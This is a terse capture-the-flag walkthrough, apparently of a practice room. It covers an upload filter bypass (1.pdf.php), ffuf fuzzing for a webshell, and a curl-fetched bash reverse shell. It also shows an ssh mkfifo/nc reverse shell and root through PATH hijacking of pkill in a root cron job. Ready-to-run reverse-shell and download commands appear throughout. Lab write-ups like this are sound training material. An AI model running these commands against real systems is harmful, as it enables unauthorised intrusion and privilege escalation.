fuzz- ffuf
php cmd=id(php command execution)
bash rev shell 
python server
curl - download
.bash_history
ssh reverse
bash tcp rev shell

did my all scans found ssh,http
web had upload.php it was to upload files. but it was only coded to get only .pdf files. these files were connected to /cvs dir. 
the code only check ".pdf " in name. we can upload this since it has .pdf in the name ->1.pdf.php

i thought still hacker had his uploaded shell in /cvs so i did fuzz attack using ffuf

[ffuf -u http://ip/cvs/FUZZ.pdf.php -w /usr/share/wordlists/dir/common.txt]

identify the php variable

[ffuf -u http://ip/cvs/shell.pdf.php?FUZZ=id -w common.txt   ]

since this has php command execution vulnerability we can upload a revshell.sh and execute it and take the remote connection.

[bash -i >& /dev/tcp/10.10.10.10/9001 0>&1 ] - saved this as rshell.sh

created a python server in that dir. and goal is to upload it into server.

[pdf.php?cmd=curl http://10.8.0.247:8000/rshell.sh --output rshell.sh]

[bash rshell.sh]

password could find on .bash_history

log in ssh and givin a reverse shell on ssh

[ssh lachlan@10.10.136.86 'bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.0.247 9001 >/tmp/f"'] - online rev shell generator- ncmkfifo

check on cron.d/persistence

cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done


pkill command not triggering from the path variable. so we can create fake pkill script in username/bin dir and it will triger in every minute.  edit pkill in home/user/bin like this

[bash -c 'bash -i >& /dev/tcp/10.8.0.247/4422 0>&1']

[bash -c 'exec bash -i &>/dev/tcp/10.4.41.28/5555 <&1']



